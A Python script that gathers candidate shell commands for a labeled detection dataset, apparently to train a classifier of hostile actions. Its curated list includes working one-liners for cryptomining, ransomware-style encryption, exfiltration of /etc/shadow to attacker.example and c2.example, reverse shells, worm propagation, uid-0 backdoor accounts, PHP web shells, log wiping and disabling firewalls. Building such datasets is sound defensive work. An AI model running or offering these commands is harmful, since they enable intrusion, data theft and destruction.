"""Fetch public command corpora and emit candidate commands (text + hint action).

Sources:
  - GTFOBins (shallow clone)         -> SUID/SUDO/shell abuse one-liners
  - InternalAllTheThings cheatsheets  -> reverse/bind shell payloads
  - static curated tool examples      -> long-tail actions (nmap/hydra/xmrig/logkeys/...)

Output: dataset/public_candidates.jsonl  {text, source, hint}
Jev does the final 31-dim labeling; hint is only a weak prior for coverage.
"""
from __future__ import annotations

import json
import re
import subprocess
import urllib.request
from pathlib import Path

import yaml

ROOT = Path(__file__).resolve().parents[1]
RAW_DIR = ROOT / "dataset" / "public_raw"
OUT = ROOT / "dataset" / "public_candidates.jsonl"

# --- static curated examples for long-tail actions (Linux/Unix focus) ---
STATIC = {
    "action.cryptomining": [
        "curl -s https://example.com/xmrig -o /tmp/x && chmod +x /tmp/x && /tmp/x -o pool.example.com:3333 -u wallet",
        "./xmrig --donate-level 0 -o stratum+tcp://pool.minexmr.com:4444 -u 4x... -p x",
        "curl -fsSL https://raw.githubusercontent.com/x/xmrig/main/xmrig | bash",
        "cpuminer -a cryptonight -o stratum+tcp://pool:4444 -u user -p x",
    ],
    "action.brute_force": [
        "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.5",
        "medusa -h 10.0.0.5 -u admin -P rockyou.txt -M ssh",
        "ncrack -p 22 --user root -P rockyou.txt 10.0.0.5",
        "nmap --script ssh-brute --script-args userdb=users.txt,passdb=pass.txt 10.0.0.5",
    ],
    "action.ransomware": [
        "openssl enc -aes-256-cbc -salt -in data.tar -out data.tar.enc -k KEY && rm -f data.tar",
        "find /home -type f -exec openssl enc -aes-256-cbc -salt -in {} -out {}.enc -k KEY \\;",
        "tar -czf - /home | openssl enc -aes-256-cbc -salt -k KEY | curl -s -X POST --data-binary @- https://c2.example/drop",
    ],
    "action.registry_persist": [  # Linux persistence equivalents (rc.local / profile / cron)
        "echo '/tmp/.backdoor &' >> /etc/rc.local",
        "echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> ~/.bashrc",
        "echo '*/5 * * * * /tmp/.x' >> /etc/crontab",
    ],
    "action.timestomp": [
        "touch -d '2019-01-01 00:00:00' /etc/passwd /etc/shadow",
        "touch -r /etc/hostname /tmp/planted.bin",
        "debugfs -w -R 'set_inode_field <inode> ctime 201901010000' /dev/sda1",
    ],
    "action.self_propagate": [
        "for h in $(cat targets.txt); do sshpass -p pw ssh -o StrictHostKeyChecking=no $h 'curl -s http://x/p.sh|sh'; done",
        "cat .ssh/id_rsa.pub | ssh user@victim 'mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys'",
        "while read ip; do scp worm.sh $ip:/tmp/ && ssh $ip 'sh /tmp/worm.sh'; done < ips.txt",
    ],
    "action.process_inject": [
        "gdb -p $(pidof target) -batch -ex 'call system(\"/bin/sh\")'",
        "echo '/tmp/evil.so' > /etc/ld.so.preload",
        "LD_PRELOAD=/tmp/evil.so ./target",
    ],
    "action.account_add": [
        "useradd -o -u 0 -g 0 -M -d /root attacker && echo 'attacker:pass' | chpasswd",
        "adduser --uid 0 --gid 0 --disabled-password attacker",
        "echo 'attacker:x:0:0::/root:/bin/bash' >> /etc/passwd",
    ],
    "action.keylog": [
        "logkeys -s -o /tmp/k.log",
        "cat /dev/input/event0 > /tmp/k.log",
        "xinput test 9 | tee /tmp/k.log",
    ],
    "action.web_shell": [
        "<?php system($_GET['cmd']); ?>",
        "<?php @eval($_POST['x']); ?>",
        "echo '<?php system($_GET[\"c\"]); ?>' > /var/www/html/cmd.php",
        "python3 -c 'import os;os.system(\"echo webshell\")' > /tmp/shell.jsp",
    ],
    "action.network_scan": [
        "nmap -sT -p- --open 192.168.1.0/24",
        "masscan -p1-65535 --rate=1000 10.0.0.0/8",
        "for ip in 192.168.1.{1..254}; do (ping -c1 -W1 $ip >/dev/null && echo $ip) & done; wait",
        "nc -zv 10.0.0.5 1-1024",
    ],
    "action.clear_logs": [
        "rm -rf /var/log/* /var/log/.??*",
        "history -c && unset HISTFILE && export HISTSIZE=0",
        "shred -zu /var/log/auth.log",
        "echo > /var/log/wtmp && echo > /var/log/btmp",
    ],
    "action.service_persist": [
        "systemctl enable /tmp/evil.service",
        "echo '[Service]\nExecStart=/tmp/x\n[Install]\nWantedBy=multi-user.target' > /etc/systemd/system/evil.service",
        "update-rc.d evil defaults",
    ],
    "action.schedule_persist": [
        "(crontab -l 2>/dev/null; echo '*/5 * * * * /tmp/.x') | crontab -",
        "echo '0 3 * * * root /tmp/backdoor' >> /etc/crontab",
        "at now + 1 minute -f /tmp/cmd.sh",
    ],
    "action.exfiltrate": [
        "curl -s -F file=@/etc/shadow https://attacker.example/upload",
        "tar -czf - /home | nc attacker.example 4444",
        "base64 /etc/passwd | curl -s -X POST --data-binary @- https://c2.example/drop",
    ],
    "action.disable_security": [
        "systemctl stop firewalld && systemctl disable firewalld",
        "iptables -F && iptables -X && iptables -P INPUT ACCEPT",
        "setenforce 0 && sed -i 's/SELINUX=enforcing/SELINUX=disabled/' /etc/selinux/config",
    ],
}


def _extract_code_blocks(md: str) -> list[str]:
    """Extract ```bash / ```sh / ```shell / ``` fenced blocks (and inline $ lines)."""
    cmds = []
    for block in re.findall(r"```(?:bash|sh|shell|console)?\s*\n(.*?)```", md, re.S):
        for line in block.splitlines():
            line = line.strip()
            if line and not line.startswith("#") and len(line) < 400:
                cmds.append(line)
    # inline $ prompts (best effort)
    for line in md.splitlines():
        m = re.match(r"^\s*\$\s+(.+)$", line)
        if m and len(m.group(1)) < 400:
            cmds.append(m.group(1).strip())
    return cmds


def _fetch_gtfobins() -> list[tuple[str, str]]:
    """Shallow clone GTFOBins, parse _gtfobins/* YAML `functions[].code` fields."""
    out = []
    repo = RAW_DIR / "GTFOBins.github.io"
    if not (repo / "_gtfobins").exists():
        RAW_DIR.mkdir(parents=True, exist_ok=True)
        subprocess.run(["git", "clone", "--depth", "1", "https://github.com/GTFOBins/GTFOBins.github.io.git", str(repo)],
                       check=False, capture_output=True)
    for p in sorted((repo / "_gtfobins").iterdir()):
        if not p.is_file():
            continue
        try:
            text = p.read_text(encoding="utf-8")
        except Exception:
            continue
        try:
            fm = yaml.safe_load(text)
        except Exception:
            continue
        funcs = fm.get("functions") if isinstance(fm, dict) else None
        if isinstance(funcs, dict):
            for _kind, entries in funcs.items():
                for e in entries or []:
                    if not isinstance(e, dict):
                        continue
                    code = e.get("code")
                    codes = code if isinstance(code, list) else [code]
                    for c in codes:
                        if isinstance(c, str) and c.strip():
                            out.append((c.strip(), "action.execute_local"))
    return out


def _fetch_iat() -> list[tuple[str, str]]:
    urls = {
        "action.reverse_shell": "https://raw.githubusercontent.com/swisskyrepo/InternalAllTheThings/main/docs/cheatsheets/shell-reverse-cheatsheet.md",
        "action.bind_shell": "https://raw.githubusercontent.com/swisskyrepo/InternalAllTheThings/main/docs/cheatsheets/shell-bind-cheatsheet.md",
    }
    out = []
    for hint, url in urls.items():
        try:
            with urllib.request.urlopen(url, timeout=30) as r:
                md = r.read().decode("utf-8", "replace")
        except Exception as e:
            print(f"  skip {url}: {e}")
            continue
        for c in _extract_code_blocks(md):
            out.append((c, hint))
    return out


def main():
    rows = []
    for action, cmds in STATIC.items():
        for c in cmds:
            rows.append((c, action))
    rows += _fetch_gtfobins()
    rows += _fetch_iat()

    seen = set()
    OUT.parent.mkdir(parents=True, exist_ok=True)
    n = 0
    with open(OUT, "w") as f:
        for text, hint in rows:
            text = text.strip()
            if not text or text in seen:
                continue
            seen.add(text)
            f.write(json.dumps({"text": text, "source": "public", "hint": hint}, ensure_ascii=False) + "\n")
            n += 1
    print(f"wrote {n} public candidates -> {OUT}")


if __name__ == "__main__":
    main()
